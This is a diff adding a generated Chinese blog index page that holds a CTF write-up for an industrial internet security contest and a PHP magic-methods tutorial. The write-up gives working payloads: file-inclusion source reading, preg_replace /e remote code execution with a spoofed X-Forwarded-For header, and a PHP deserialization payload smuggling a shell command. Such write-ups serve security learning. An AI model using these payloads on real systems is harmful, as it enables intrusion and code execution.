@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Mr1.Grim</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/开发工具/">玩转开发工具</a></li>
+                        
+                            <li><a  href="/categories/digital">玩转数码</a></li>
+                        
+                            <li><a  href="/categories/algorithm">算法学习</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mr1.Grim</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Mr1.Grim</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/开发工具/">玩转开发工具</a></li>
+                
+                    <li><a href="/categories/digital">玩转数码</a></li>
+                
+                    <li><a href="/categories/algorithm">算法学习</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-saibo" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/saibo/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.586Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/saibo/">赛博地球杯工业互联网安全大赛</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="大量设备报表不见了（签道题）"><a href="#大量设备报表不见了（签道题）" class="headerlink" title="大量设备报表不见了（签道题）"></a>大量设备报表不见了（签道题）</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<br><br><a href="http://120.27.14.73:20006/" target="_blank" rel="noopener">http://120.27.14.73:20006/</a></p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>报表中心有链接,url为<br><br><a href="http://120.27.14.73:20006/index.php?id=1" target="_blank" rel="noopener">http://120.27.14.73:20006/index.php?id=1</a> <br></p>
+<p>尝试sql注入都没反应,猜测是爆破,用burpsuite或者写个脚本,当id=2333时出现flag<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/1.png" alt="image"></p>
+<h2 id="工控云管理系统设备维护中心被植入后门"><a href="#工控云管理系统设备维护中心被植入后门" class="headerlink" title="工控云管理系统设备维护中心被植入后门"></a>工控云管理系统设备维护中心被植入后门</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统<br><a href="http://47.104.74.209:20005" target="_blank" rel="noopener">http://47.104.74.209:20005</a></p>
+<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>访问index.php?page=index 猜想文件包含漏洞<br><br>利用page参数和php伪协议读取源码<br>:<br>index.php?page=php://filter/read=convert.base64-encode/resource=index.php<br><br>得到index.php源码<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    if ($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] === &apos;127.0.0.1&apos;) &#123;</span><br><span class="line">        echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line">        $pattern = $_GET[pat];</span><br><span class="line">        $replacement = $_GET[rep];</span><br><span class="line">        $subject = $_GET[sub];</span><br><span class="line">        if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">            preg_replace($pattern, $replacement, $subject);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="payload-存在后门，添加头部和对应GET字段。"><a href="#payload-存在后门，添加头部和对应GET字段。" class="headerlink" title="payload: 存在后门，添加头部和对应GET字段。"></a>payload: 存在后门，添加头部和对应GET字段。</h4><ul>
+<li>X-Forwarded-For: 127.0.0.1;</li>
+<li>?pat=/test/e&amp;rep=system(‘ls’)&amp;sub=aa <br><br>使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行<br><br>发现一个目录s3chahahaDir，之后还有一个目录flag，里面有flag.php<h3 id="payload-final"><a href="#payload-final" class="headerlink" title="payload: final"></a>payload: final</h3></li>
+<li>?pat=/test/e&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)&amp;sub=aa</li>
+</ul>
+<h4 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h4><p>flag{SecuriTY_Preg_eee3}</p>
+<h2 id="工控系统的敏感消息遭泄漏"><a href="#工控系统的敏感消息遭泄漏" class="headerlink" title="工控系统的敏感消息遭泄漏"></a>工控系统的敏感消息遭泄漏</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。<br><a href="http://47.104.99.231:20003/" target="_blank" rel="noopener">http://47.104.99.231:20003/</a></p>
+<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>发现git源码泄漏,用githack获取源码进行审计<br><br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack链接说明使用</a><br><br>index2.php代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$secret = $_GET[&apos;secret&apos;];</span><br><span class="line">$ad  = $_GET[&apos;ad&apos;];</span><br><span class="line">if(isset($ad))&#123;</span><br><span class="line">    if(ereg(&quot;^[a-zA-Z0-9]+$&quot;, $ad) === FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;script&gt;alert(&quot;Sorry ! Again !&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif(strpos($ad, &apos;--&apos;) !== FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">				echo &quot;Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;&quot;;</span><br><span class="line">				if (stripos($secret, &apos;./&apos;) &gt; 0) &#123;</span><br><span class="line">					die();</span><br><span class="line">				&#125;</span><br><span class="line">        unserialize($secret);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;script&gt;alert(&quot;Sorry ! You must have --&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>ereg用%00截断ad=a%00– <br><br>class.php代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">class Record&#123;</span><br><span class="line">    public $file=&quot;Welcome&quot;;</span><br><span class="line"> </span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = &apos;sleep.txt&apos;;</span><br><span class="line">        return array(&apos;file&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = &apos;wakeup.txt&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;file != &apos;wakeup.txt&apos; &amp;&amp; $this-&gt;file != &apos;sleep.txt&apos; &amp;&amp; $this-&gt;file != &apos;Welcome&apos;) &#123;</span><br><span class="line">            system(&quot;php ./import/$this-&gt;file.php&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;?php Something destroyed ?&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$b =new Record(&apos;Welcome&apos;);</span><br><span class="line">unset($b);</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">php反序列化漏洞绕过魔术方法</a><br></p>
+<p>反序列化时<strong>wakeup方法的调用会设置file为wakeup.txt，CVE-2016-7124中提到可以如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得</strong>wakeup失效<br></p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:<br></h4><p>/index2.php?file=Flag&amp;ad[]=–&amp;secret=O:6:”Record”:2:{s:4:”file”;s:50:”p.php||tac /var/www/html/import/Flag.php ||echo 1”;}</p>
+<h2 id="工控管理系统新版本"><a href="#工控管理系统新版本" class="headerlink" title="工控管理系统新版本"></a>工控管理系统新版本</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p>云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。<br><a href="http://47.104.1.173:20004/" target="_blank" rel="noopener">http://47.104.1.173:20004/</a></p>
+<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP魔术方法" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP魔术方法/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.586Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP魔术方法/">PHP之魔术方法</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>_construct()， <strong>destruct()， </strong>call()， <strong>callStatic()， </strong>get()， <strong>set()， </strong>isset()， <strong>unset()，
+</strong>sleep()， <strong>wakeup()， </strong>toString()， <strong>invoke()， </strong>set_state()， <strong>clone() 和 </strong>debugInfo() 等方法在 PHP 中被称为”魔术方法”（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 </p>
+<p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods),这些方法在PHP中充当了举足轻重的作用。这里进行详细介绍，感兴趣的小伙伴们可以参考一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></p>
+<h2 id="类的构造函数-construct"><a href="#类的构造函数-construct" class="headerlink" title="类的构造函数 __construct()"></a>类的构造函数 __construct()</h2><p>php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p>
+<ul>
+<li>在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。</li>
+<li>构造方法名称是以两个下画线开始的__construct()<h3 id="构造方法的作用"><a href="#构造方法的作用" class="headerlink" title="构造方法的作用"></a>构造方法的作用</h3>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $age;</span><br><span class="line">	public $sex;</span><br><span class="line">	/**</span><br><span class="line">     * 显示声明一个构造方法且带参数</span><br><span class="line">     */</span><br><span class="line">     public function __construct($name=&quot;&quot;,$sex=&quot;boy&quot;,$age=22)</span><br><span class="line">     &#123;</span><br><span class="line">     	$this-&gt;name = $name;</span><br><span class="line">     	$this-&gt;sex = $sex;</span><br><span class="line">     	$this-&gt;age = $age;</span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * say 方法</span><br><span class="line">     */</span><br><span class="line">    public function say()</span><br><span class="line">    &#123; </span><br><span class="line">      echo &quot;我叫：&quot; . $this-&gt;name . &quot;，性别：&quot; . $this-&gt;sex . &quot;，年龄：&quot; . $this-&gt;age;</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>创建对象$Person1且不带任何参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person1 = new Person();</span><br><span class="line">echo $Person1-&gt;say(); //输出:我叫:,性别:boy,年龄:22</span><br></pre></td></tr></table></figure></p>
+<p>创建对象$Person2且带参数“小明”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person2 = new Person(&quot;小明&quot;);</span><br><span class="line">echo $Person2-&gt;say(); //输出：我叫:小明，性别:boy,年龄:22</span><br></pre></td></tr></table></figure></p>
+<p>创建对象$Person3且带三个参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);</span><br><span class="line">echo $Person3-&gt;say(); //输出:我叫:李四,性别:男,年龄:25</span><br></pre></td></tr></table></figure></p>
+<h2 id="类的析构函数-destruct"><a href="#类的析构函数-destruct" class="headerlink" title="类的析构函数 __destruct()"></a>类的析构函数 __destruct()</h2><p>通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。</p>
+<p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。</p>
+<p>析构方法是PHP5才引进的新内容。</p>
+<p>析造方法的声明格式与构造方法 <strong>construct() 比较类似，也是以两个下划线开始的方法 </strong>destruct() ，这种析构方法名称也是固定的。</p>
+<h3 id="析构方法的作用"><a href="#析构方法的作用" class="headerlink" title="析构方法的作用"></a>析构方法的作用</h3><p>一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。</p>
+<h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person&#123;   </span><br><span class="line">                             </span><br><span class="line">  public $name;     </span><br><span class="line">  public $age;     </span><br><span class="line">  public $sex;     </span><br><span class="line">                                   </span><br><span class="line">  public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=22)</span><br><span class="line">  &#123;  </span><br><span class="line">    $this-&gt;name = $name;</span><br><span class="line">    $this-&gt;sex = $sex;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  /**</span><br><span class="line">   * say 说话方法</span><br><span class="line">   */</span><br><span class="line">  public function say()</span><br><span class="line">  &#123; </span><br><span class="line">    echo &quot;我叫：&quot;.$this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age;</span><br><span class="line">  &#125;  </span><br><span class="line">   </span><br><span class="line">  /**</span><br><span class="line">   * 声明一个析构方法</span><br><span class="line">   */</span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">      echo &quot;我觉得我还可以再抢救一下，我的名字叫&quot;.$this-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$Person = new Person(&quot;小明&quot;);</span><br><span class="line">unset($Person); //销毁上面创建的对象$Person</span><br></pre></td></tr></table></figure>
+<p>输出为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我觉得我还可以再抢救一下，我的名字叫小明</span><br></pre></td></tr></table></figure></p>
+<h2 id="类被当成字符串时的回应方法-toString"><a href="#类被当成字符串时的回应方法-toString" class="headerlink" title="类被当成字符串时的回应方法 __toString()"></a>类被当成字符串时的回应方法 __toString()</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。<br></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>此方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p>
+<h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">  public $sex;</span><br><span class="line">  public $name;</span><br><span class="line">  public $age;</span><br><span class="line"> </span><br><span class="line">  public function __construct($name=&quot;&quot;, $age=25, $sex=&apos;男&apos;)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;name = $name;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">    $this-&gt;sex = $sex;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  public function __toString()</span><br><span class="line">  &#123;</span><br><span class="line">    return &apos;go go go&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$person = new Person(&apos;小明&apos;); // 初始赋值</span><br><span class="line">echo $person;</span><br></pre></td></tr></table></figure>
+<p>输出为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go go go</span><br></pre></td></tr></table></figure></p>
